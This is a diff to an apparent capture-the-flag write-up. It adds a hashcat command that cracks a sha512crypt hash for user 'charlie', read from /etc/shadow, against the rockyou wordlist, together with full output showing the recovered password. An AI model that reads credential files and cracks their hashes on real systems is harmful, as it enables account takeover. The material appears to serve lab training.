@@ -81,6 +81,25 @@ charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdD
 ```
 
 ## Read `/etc/shadow` and crack Charlies password.
+```bash
+$ hashcat -a 0 -m 1800 '$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.' rockyou.txt
+$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:password1
 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: $6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0K...GOyhL.
+Time.Started.....: Wed Jun 30 12:00:11 2021 (3 secs)
+Time.Estimated...: Wed Jun 30 12:00:14 2021 (0 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#2.........:     1098 H/s (7.32ms) @ Accel:8 Loops:16 Thr:8 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 3072/14344384 (0.02%)
+Rejected.........: 0/3072 (0.00%)
+Restore.Point....: 0/14344384 (0.00%)
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidates.#2....: 123456 -> dangerous
+```
 ## What is `flag1.txt`?
 
